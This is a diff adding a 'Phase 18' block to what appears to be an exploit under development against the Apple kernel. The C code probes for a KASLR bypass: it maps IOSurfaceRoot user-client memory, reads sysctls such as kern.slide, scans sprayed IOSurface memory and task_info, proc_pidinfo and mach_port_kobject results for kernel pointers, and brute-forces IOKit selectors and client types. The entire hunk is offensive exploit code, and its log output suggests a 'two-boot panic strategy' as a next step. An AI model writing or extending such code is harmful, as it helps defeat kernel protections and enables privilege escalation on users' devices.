@@ -22163,6 +22163,394 @@ new_modes:
         }
 
 
+        /* ================================================================
+         * Phase 18 (r=229): Comprehensive KASLR bypass probing
+         *
+         * Since IOSurfaceRootUserClient selectors are blocked, try:
+         * 1. IOConnectMapMemory with various memory types
+         * 2. sysctl probes (kern.slide, kern.boottime, etc.)
+         * 3. IOSurface shared memory header scan for kernel pointers
+         * 4. proc_pidinfo region scanning
+         * 5. task_info flavors
+         * 6. IOConnectCallStructMethod (vs scalar method)
+         * 7. Alternate user client types (1, 2, etc.)
+         * 8. mach_port_kobject on IOSurface ports
+         * ================================================================ */
+        if (rounds == 229 && r229_matched_idx >= 0) {
+            rlog("\n=== Phase 18 (r=229): Comprehensive KASLR Probing ===\n");
+
+            uint64_t p18_leaked = 0;
+
+            /* 18a: IOConnectMapMemory with types 0-15 */
+            rlog("\n  --- 18a: IOConnectMapMemory ---\n");
+            {
+                io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (svc) {
+                    io_connect_t conn = IO_OBJECT_NULL;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                    IOObjectRelease(svc);
+                    if (kr == KERN_SUCCESS) {
+                        for (uint32_t mtype = 0; mtype < 16; mtype++) {
+                            mach_vm_address_t addr = 0;
+                            mach_vm_size_t sz = 0;
+                            kr = IOConnectMapMemory64(conn, mtype, mach_task_self(),
+                                &addr, &sz, kIOMapAnywhere);
+                            if (kr == KERN_SUCCESS && addr && sz > 0) {
+                                rlog("  MapMem type %u: addr=0x%llx size=0x%llx\n",
+                                     mtype, (unsigned long long)addr,
+                                     (unsigned long long)sz);
+                                /* Scan mapped memory for kernel pointers */
+                                uint64_t *p = (uint64_t *)(uintptr_t)addr;
+                                size_t nqw = (size_t)(sz / 8);
+                                if (nqw > 4096) nqw = 4096;
+                                int found = 0;
+                                for (size_t i = 0; i < nqw && found < 10; i++) {
+                                    uint64_t v = p[i];
+                                    if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff) {
+                                        rlog("  *** MapMem KPTR type %u +%zu: 0x%016llx ***\n",
+                                             mtype, i * 8, (unsigned long long)v);
+                                        if (!p18_leaked) p18_leaked = v;
+                                        found++;
+                                    }
+                                }
+                                IOConnectUnmapMemory64(conn, mtype, mach_task_self(), addr);
+                            } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                                rlog("  MapMem type %u: kr=0x%x\n", mtype, kr);
+                            }
+                        }
+                        IOServiceClose(conn);
+                    }
+                }
+            }
+
+            /* 18b: sysctl probes */
+            rlog("\n  --- 18b: sysctl probes ---\n");
+            {
+                /* Try kern.slide (usually root-only but worth trying) */
+                uint64_t slide = 0;
+                size_t slide_sz = sizeof(slide);
+                int r = sysctlbyname("kern.slide", &slide, &slide_sz, NULL, 0);
+                rlog("  kern.slide: ret=%d val=0x%llx\n", r, (unsigned long long)slide);
+                if (r == 0 && slide > 0) {
+                    rlog("  *** KASLR SLIDE FROM SYSCTL: 0x%llx ***\n",
+                         (unsigned long long)slide);
+                    p18_leaked = slide;
+                }
+
+                /* Try other sysctls that might leak info */
+                const char *probes[] = {
+                    "kern.bootargs", "kern.version", "kern.osrelease",
+                    "hw.machine", "hw.model",
+                    "machdep.cpu.brand_string", "kern.monotoniclock",
+                    NULL
+                };
+                for (int i = 0; probes[i]; i++) {
+                    char buf[256] = {0};
+                    size_t bsz = sizeof(buf);
+                    r = sysctlbyname(probes[i], buf, &bsz, NULL, 0);
+                    if (r == 0 && bsz > 0 && bsz < 256) {
+                        buf[bsz] = 0;
+                        rlog("  %s = %s\n", probes[i], buf);
+                    }
+                }
+
+                /* Try numeric sysctls that might leak kernel addresses */
+                uint64_t val64 = 0;
+                size_t v64sz = sizeof(val64);
+                const char *num_probes[] = {
+                    "kern.maxproc", "kern.maxvnodes", "kern.ngroups",
+                    "kern.argmax", "kern.securelevel",
+                    "vm.swapusage", "kern.boottime",
+                    NULL
+                };
+                for (int i = 0; num_probes[i]; i++) {
+                    val64 = 0;
+                    v64sz = sizeof(val64);
+                    r = sysctlbyname(num_probes[i], &val64, &v64sz, NULL, 0);
+                    if (r == 0 && (val64 >> 40) == 0xfffffe) {
+                        rlog("  *** KPTR %s = 0x%016llx ***\n",
+                             num_probes[i], (unsigned long long)val64);
+                        if (!p18_leaked) p18_leaked = val64;
+                    }
+                }
+            }
+
+            /* 18c: IOSurface shared memory header scan */
+            rlog("\n  --- 18c: IOSurface shared memory scan ---\n");
+            {
+                IOSurfaceRef surf = r229_spray_static[r229_matched_idx];
+                if (surf) {
+                    IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+                    void *base = IOSurfaceGetBaseAddress(surf);
+                    size_t alloc_sz = IOSurfaceGetAllocSize(surf);
+                    rlog("  Surface base=%p alloc=%zu\n", base, alloc_sz);
+
+                    if (base && alloc_sz > 0) {
+                        /* Scan BEFORE the pixel data - look at the mapping header */
+                        /* The mmap'd region might start before base address */
+                        /* Try scanning from (base - 4096) to (base + min(alloc_sz, 16384)) */
+                        uint8_t *scan_start = (uint8_t *)base;
+                        size_t scan_len = alloc_sz < 32768 ? alloc_sz : 32768;
+                        int found = 0;
+
+                        for (size_t i = 0; i + 8 <= scan_len && found < 20; i += 4) {
+                            uint64_t v;
+                            memcpy(&v, scan_start + i, 8);
+                            if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff) {
+                                rlog("  *** IOSurf KPTR at +%zu: 0x%016llx ***\n",
+                                     i, (unsigned long long)v);
+                                if (!p18_leaked) p18_leaked = v;
+                                found++;
+                            }
+                        }
+
+                        /* Also check the seed and other header fields */
+                        uint32_t seed = IOSurfaceGetSeed(surf);
+                        int in_use = IOSurfaceIsInUse(surf);
+                        rlog("  Seed=%u InUse=%d\n", seed, in_use);
+
+                        /* Dump first 256 bytes of shared memory for analysis */
+                        rlog("  First 256 bytes of surface memory:\n");
+                        for (int d = 0; d < 256 && (size_t)d < scan_len; d += 32) {
+                            rlog("  +%03x:", d);
+                            for (int b = 0; b < 32 && d + b < 256; b++)
+                                rlog(" %02x", scan_start[d + b]);
+                            rlog("\n");
+                        }
+                    }
+                    IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+                }
+            }
+
+            /* 18d: task_info probes */
+            rlog("\n  --- 18d: task_info probes ---\n");
+            {
+                /* TASK_DYLD_INFO = 17 */
+                struct task_dyld_info dinfo;
+                mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+                kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+                    (task_info_t)&dinfo, &cnt);
+                if (kr == KERN_SUCCESS) {
+                    rlog("  DYLD all_image_info_addr=0x%llx size=%llu fmt=%d\n",
+                         (unsigned long long)dinfo.all_image_info_addr,
+                         (unsigned long long)dinfo.all_image_info_size,
+                         dinfo.all_image_info_format);
+                }
+
+                /* Try various task_info flavors for kernel data */
+                /* TASK_EXTMOD_INFO = 19 (task extended modification info) */
+                uint64_t extmod[32] = {0};
+                cnt = 32;
+                kr = task_info(mach_task_self(), 19, (task_info_t)extmod, &cnt);
+                if (kr == KERN_SUCCESS) {
+                    rlog("  EXTMOD cnt=%u\n", cnt);
+                    for (uint32_t i = 0; i < cnt; i++) {
+                        if ((extmod[i] >> 40) == 0xfffffe) {
+                            rlog("  *** TASK_EXTMOD KPTR[%u] = 0x%016llx ***\n",
+                                 i, (unsigned long long)extmod[i]);
+                            if (!p18_leaked) p18_leaked = extmod[i];
+                        }
+                    }
+                }
+
+                /* TASK_VM_INFO = 22 */
+                struct task_vm_info vm_info;
+                cnt = sizeof(vm_info) / sizeof(natural_t);
+                kr = task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vm_info, &cnt);
+                if (kr == KERN_SUCCESS) {
+                    rlog("  VM_INFO: vsize=%llu rsize=%llu reusable=%llu\n",
+                         (unsigned long long)vm_info.virtual_size,
+                         (unsigned long long)vm_info.resident_size,
+                         (unsigned long long)vm_info.reusable);
+                    /* Check min_address / max_address for kernel leaks */
+                    rlog("  min_addr=0x%llx max_addr=0x%llx\n",
+                         (unsigned long long)vm_info.min_address,
+                         (unsigned long long)vm_info.max_address);
+                    if ((vm_info.min_address >> 40) == 0xfffffe ||
+                        (vm_info.max_address >> 40) == 0xfffffe) {
+                        rlog("  *** VM_INFO KPTR ***\n");
+                        if (!p18_leaked) p18_leaked = vm_info.min_address;
+                    }
+                }
+            }
+
+            /* 18e: IOConnectCallStructMethod (struct-only interface) */
+            rlog("\n  --- 18e: IOConnectCallStructMethod ---\n");
+            {
+                io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (svc) {
+                    io_connect_t conn = IO_OBJECT_NULL;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                    IOObjectRelease(svc);
+                    if (kr == KERN_SUCCESS) {
+                        /* Try struct-only method calls for selectors 0-20 */
+                        for (uint32_t sel = 0; sel <= 20; sel++) {
+                            uint8_t in_buf[64];
+                            memset(in_buf, 0, sizeof(in_buf));
+                            /* For sel6 (lookup), put surface ID in struct */
+                            if (sel == 6) {
+                                uint32_t sid = IOSurfaceGetID(r229_spray_static[r229_matched_idx]);
+                                memcpy(in_buf, &sid, 4);
+                            }
+
+                            uint8_t out_buf[4096];
+                            memset(out_buf, 0, sizeof(out_buf));
+                            size_t out_sz = sizeof(out_buf);
+
+                            kr = IOConnectCallStructMethod(conn, sel,
+                                in_buf, sizeof(in_buf), out_buf, &out_sz);
+
+                            if (kr != 0xe00002c2) { /* Not unsupported */
+                                rlog("  StructMethod sel%u: kr=0x%x out=%zu\n",
+                                     sel, kr, out_sz);
+                                if (kr == KERN_SUCCESS && out_sz > 0) {
+                                    uint64_t *op = (uint64_t *)out_buf;
+                                    for (size_t q = 0; q < out_sz / 8 && q < 64; q++) {
+                                        if ((op[q] >> 40) == 0xfffffe) {
+                                            rlog("  *** StructMethod KPTR sel%u +%zu: 0x%016llx ***\n",
+                                                 sel, q * 8, (unsigned long long)op[q]);
+                                            if (!p18_leaked) p18_leaked = op[q];
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        IOServiceClose(conn);
+                    }
+                }
+            }
+
+            /* 18f: Alternate user client types */
+            rlog("\n  --- 18f: Alternate user client types ---\n");
+            {
+                io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (svc) {
+                    for (uint32_t uctype = 1; uctype <= 4; uctype++) {
+                        io_connect_t conn = IO_OBJECT_NULL;
+                        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), uctype, &conn);
+                        rlog("  UserClient type %u: kr=0x%x\n", uctype, kr);
+                        if (kr == KERN_SUCCESS) {
+                            /* Try sel6 lookup on this client type */
+                            uint64_t s_in[1] = { IOSurfaceGetID(r229_spray_static[r229_matched_idx]) };
+                            uint32_t s_cnt = 16;
+                            uint64_t s_out[16] = {0};
+                            kr = IOConnectCallMethod(conn, 6,
+                                s_in, 1, NULL, 0, s_out, &s_cnt, NULL, NULL);
+                            rlog("    sel6: kr=0x%x cnt=%u\n", kr, s_cnt);
+                            if (kr == KERN_SUCCESS) {
+                                for (uint32_t j = 0; j < s_cnt; j++) {
+                                    if ((s_out[j] >> 40) == 0xfffffe) {
+                                        rlog("    *** KPTR type%u sel6[%u] = 0x%016llx ***\n",
+                                             uctype, j, (unsigned long long)s_out[j]);
+                                        if (!p18_leaked) p18_leaked = s_out[j];
+                                    }
+                                }
+                            }
+
+                            /* Try MapMemory on this client type */
+                            for (uint32_t mt = 0; mt < 4; mt++) {
+                                mach_vm_address_t addr = 0;
+                                mach_vm_size_t sz = 0;
+                                kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                                    &addr, &sz, kIOMapAnywhere);
+                                if (kr == KERN_SUCCESS && addr && sz > 0) {
+                                    rlog("    MapMem type%u mem%u: addr=0x%llx sz=0x%llx\n",
+                                         uctype, mt, (unsigned long long)addr,
+                                         (unsigned long long)sz);
+                                    uint64_t *p = (uint64_t *)(uintptr_t)addr;
+                                    size_t nqw = (size_t)(sz / 8);
+                                    if (nqw > 2048) nqw = 2048;
+                                    for (size_t i = 0; i < nqw; i++) {
+                                        if ((p[i] >> 40) == 0xfffffe) {
+                                            rlog("    *** MapMem KPTR +%zu: 0x%016llx ***\n",
+                                                 i * 8, (unsigned long long)p[i]);
+                                            if (!p18_leaked) p18_leaked = p[i];
+                                            break;
+                                        }
+                                    }
+                                    IOConnectUnmapMemory64(conn, mt, mach_task_self(), addr);
+                                }
+                            }
+                            IOServiceClose(conn);
+                        }
+                    }
+                    IOObjectRelease(svc);
+                }
+            }
+
+            /* 18g: mach_port_kobject on surface-related ports */
+            rlog("\n  --- 18g: mach_port_kobject ---\n");
+            {
+                /* Try mach_port_kobject on the IOKit master port and task port */
+                natural_t kotype = 0;
+                mach_vm_address_t koaddr = 0;
+                kern_return_t kr;
+
+                kr = mach_port_kobject(mach_task_self(),
+                    mach_task_self(), &kotype, (mach_port_t *)&koaddr);
+                rlog("  task_self kobject: kr=0x%x type=%u addr=0x%llx\n",
+                     kr, kotype, (unsigned long long)koaddr);
+                if (kr == KERN_SUCCESS && (koaddr >> 40) == 0xfffffe) {
+                    rlog("  *** TASK KPTR: 0x%016llx ***\n",
+                         (unsigned long long)koaddr);
+                    if (!p18_leaked) p18_leaked = koaddr;
+                }
+
+                kr = mach_port_kobject(mach_task_self(),
+                    mach_host_self(), &kotype, (mach_port_t *)&koaddr);
+                rlog("  host_self kobject: kr=0x%x type=%u addr=0x%llx\n",
+                     kr, kotype, (unsigned long long)koaddr);
+                if (kr == KERN_SUCCESS && (koaddr >> 40) == 0xfffffe) {
+                    rlog("  *** HOST KPTR: 0x%016llx ***\n",
+                         (unsigned long long)koaddr);
+                    if (!p18_leaked) p18_leaked = koaddr;
+                }
+            }
+
+            /* 18h: proc_pidinfo with various flavors using raw buffers */
+            rlog("\n  --- 18h: proc_pidinfo probes ---\n");
+            {
+                pid_t mypid = getpid();
+                uint8_t pi_buf[4096];
+                /* Try flavors 1-20 */
+                for (int flav = 1; flav <= 20; flav++) {
+                    memset(pi_buf, 0, sizeof(pi_buf));
+                    int ret = proc_pidinfo(mypid, flav, 0, pi_buf, sizeof(pi_buf));
+                    if (ret > 0) {
+                        uint64_t *qw = (uint64_t *)pi_buf;
+                        int nqw = ret / 8;
+                        for (int qi = 0; qi < nqw; qi++) {
+                            if ((qw[qi] >> 40) == 0xfffffe) {
+                                rlog("  *** proc_pidinfo flav=%d field %d: 0x%016llx ***\n",
+                                     flav, qi, (unsigned long long)qw[qi]);
+                                if (!p18_leaked) p18_leaked = qw[qi];
+                            }
+                        }
+                    }
+                }
+                rlog("  proc_pidinfo scan done\n");
+            }
+
+            /* === Phase 18 Summary === */
+            rlog("\n=== Phase 18 Summary ===\n");
+            if (p18_leaked) {
+                rlog("*** KASLR LEAK FOUND: 0x%016llx ***\n",
+                     (unsigned long long)p18_leaked);
+            } else {
+                rlog("No kernel pointer leaked via any tested path.\n");
+                rlog("Remaining ideas:\n");
+                rlog(" - Two-boot panic strategy (crash, reboot, hardcode slide)\n");
+                rlog(" - kqueue/kevent notification interception\n");
+                rlog(" - Thread exception port for controlled kernel fault info\n");
+            }
+            rlog("--- Phase 18 complete ---\n");
+        }
+
+
+
         /*
          * Phase 15: Structure offset crash oracle
          *
